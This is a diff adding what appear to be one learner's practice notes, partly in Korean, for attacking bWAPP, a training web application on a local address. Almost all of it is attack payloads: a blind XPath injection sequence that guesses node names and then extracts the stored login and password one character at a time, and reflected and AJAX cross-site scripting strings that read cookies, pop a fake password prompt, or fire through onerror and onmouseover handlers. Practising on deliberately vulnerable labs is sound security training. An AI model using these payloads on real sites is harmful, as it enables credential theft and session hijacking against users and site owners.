@@ -1,0 +1,126 @@
+
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=2]))=1 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=2]))=2 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=2]))=3 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=2]))=4 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=2]))=5 or '1'='1
+
+neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),1,1)='l' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),2,1)='o' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),3,1)='g' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),4,1)='i' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),5,1)='n' or '1'='1
+neo' and name(/heroes/hero[1]/child::*[position()=2])='login' or '1'='1
+
+
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=1 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=2 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=3 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=4 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=5 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=6 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=7 or '1'='1
+neo' and string-length(name(/heroes/hero[1]/child::*[position()=3]))=8 or '1'='1
+
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),1,1)='p' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),2,1)='a' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),3,1)='s' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),4,1)='s' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),5,1)='w' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),6,1)='o' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),7,1)='r' or '1'='1
+neo' and substring(name(/heroes/hero[1]/child::*[position()=3]),8,1)='d' or '1'='1
+neo' and name(/heroes/hero[1]/child::*[position()=3])='password' or '1'='1
+
+neo' and string-length(string(//hero[1]/login))=1 or '1'='1
+neo' and string-length(string(//hero[1]/login))=2 or '1'='1
+neo' and string-length(string(//hero[1]/login))=3 or '1'='1
+
+neo' and substring(//hero[1]/login,1,1)='n' or '1'='1
+neo' and substring(//hero[1]/login,2,1)='e' or '1'='1
+neo' and substring(//hero[1]/login,3,1)='o' or '1'='1
+neo' and string(//hero[1]/login)='neo' or '1'='1
+
+neo' and string-length(string(//hero[1]/password))=1 or '1'='1
+neo' and string-length(string(//hero[1]/password))=2 or '1'='1
+neo' and string-length(string(//hero[1]/password))=3 or '1'='1
+neo' and string-length(string(//hero[1]/password))=4 or '1'='1
+neo' and string-length(string(//hero[1]/password))=5 or '1'='1
+neo' and string-length(string(//hero[1]/password))=6 or '1'='1
+neo' and string-length(string(//hero[1]/password))=7 or '1'='1
+
+
+neo' and substring(//hero[1]/password,1,1)='t' or '1'='1
+neo' and substring(//hero[1]/password,2,1)='r' or '1'='1
+neo' and substring(//hero[1]/password,3,1)='i' or '1'='1
+neo' and substring(//hero[1]/password,3,1)='n' or '1'='1
+neo' and substring(//hero[1]/password,3,1)='i' or '1'='1
+neo' and substring(//hero[1]/password,3,1)='t' or '1'='1
+neo' and substring(//hero[1]/password,3,1)='y' or '1'='1
+neo' and string(//hero[1]/password)='trinity' or '1'='1
+
+XSS - Reflected (GET)
+
+<script>alert("hello")</script>
+<script>alert(document.cookie)</script>
+
+firstname=<script>alert("hello")</script>&lastname=<script>alert(document.cookie)</script>&form=submit
+
+<script>
+
+       var JSONResponseString = '{"movies":[{"response":"Yes! We have that movie..."}]}';
+
+       // var JSONResponse = eval ("(" + JSONResponseString + ")");
+       var JSONResponse = JSON.parse(JSONResponseString);
+
+       document.getElementById("result").innerHTML=JSONResponse.movies[0].response;
+
+   </script>
+
+
+   <script>
+
+       var JSONResponseString = '{"movies":[{"response":"abcd??? Sorry, we don&#039;t have that movie :("}]}';
+
+       // var JSONResponse = eval ("(" + JSONResponseString + ")");
+       var JSONResponse = JSON.parse(JSONResponseString);
+
+       document.getElementById("result").innerHTML=JSONResponse.movies[0].response;
+
+   </script>
+
+"}]}'; </script><script>prompt('Please enter your password.')</script><script>
+
+이대로 injection 진행 해보면될것.
+
+GET /bWAPP/xss_ajax_2-2.php title=<script>alert(document.cookie)</script>HTTP/1.1
+
+http://192.168.20.205/bWAPP/xss_ajax_2-2.php?title=%3Cscript%3Ealert(document.cookie)%3C/script%3E < url 로 접근가능
+
+http://192.168.20.205/bWAPP/xss_ajax_2-2.php?title=<script>prompt('Please enter your password.')</script>
+
+<img src='#' onerror='alert(1)'>
+
+';alert(1);'
+
+bWAPP:<script>alert(1)</script>
+
+alert(1)
+prompt('Please enter your password.')
+
+><script>alert("hello")</script>
+
+        <tr height="30">
+
+            <td>G.I. Joe: Retaliation</td>
+            <td align="center">2013</td>
+            <td>Cobra Commander</td>
+            <td align="center">action</td>
+            <td align="center"> <a href=xss_href-3.php?movie=1&name=><script>alert("hello")</script>&action=vote>Vote</a></td>
+
+><script>prompt('Please enter your password.')</script>
+
+
+kim onmouseover=alert("hello") aaa
+
+         <td align="center"> <a href=xss_href-3.php?movie=1&name=kim onmouseover=alert("hello") aaa&action=vote>Vote</a></td>
